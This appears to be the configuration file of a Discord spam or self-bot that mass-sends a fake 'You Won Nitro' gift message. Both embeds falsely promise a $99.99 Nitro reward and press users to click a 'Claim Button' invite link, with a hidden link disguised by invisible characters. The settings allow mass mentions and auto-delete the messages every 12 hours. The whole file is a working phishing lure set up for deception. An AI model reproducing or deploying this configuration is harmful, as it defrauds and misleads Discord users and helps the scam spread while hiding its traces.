module.exports = {
    // ============= TOKEN & WEBHOOK (process.env'den) =============
    token: process.env.token,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    // ============= GELİŞMİŞ AYARLAR =============
    advanced: {
        limit: 5,
        leave: true
    },

    // ============= OTOMATİK SİLME =============
    auto_delete: {
        enabled: true,
        interval_seconds: 43200  // 12 saat
    },

    // ============= KARA LİSTE & LİMİTLER =============
    blacklist: [],
    mention_limit: 10000,

    // ============= ANA MESAJ (Nitro Ödülü) =============
    embed: [
        {
            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n\n> In order to redeem your 99.99$ Discord Nitro gift, you MUST click the **[Claim Button](https://discord.gg/M9sX68Vqxr)**\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)"
        }
    ],

    // ============= İKİNCİ MESAJ (Aynı, farklı olay için) =============
    embed2: [
        {
            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n\n> In order to redeem your 99.99$ Discord Nitro gift, you MUST click the **[Claim Button](https://discord.gg/M9sX68Vqxr)**\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)"
        }
    ]
};
